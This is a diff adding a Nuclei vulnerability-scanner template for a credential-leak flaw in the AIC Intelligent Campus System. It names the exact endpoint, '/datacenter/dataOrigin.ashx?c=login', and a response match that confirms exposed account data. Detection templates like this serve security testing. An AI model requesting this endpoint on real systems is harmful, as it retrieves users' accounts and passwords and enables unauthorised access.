@@ -1,0 +1,24 @@
+id: aic-intelligent-campus-info-leak
+
+info:
+  name: AIC Intelligent Campus System Password Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    AIC Intelligent Campus System contains an information disclosure vulnerability where
+    attackers can construct a special URL to retrieve user accounts and passwords, enabling
+    system access.
+  tags: information-disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/datacenter/dataOrigin.ashx?c=login"
+    headers:
+      User-Agent: Nuclei-Scanner
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "卡号"
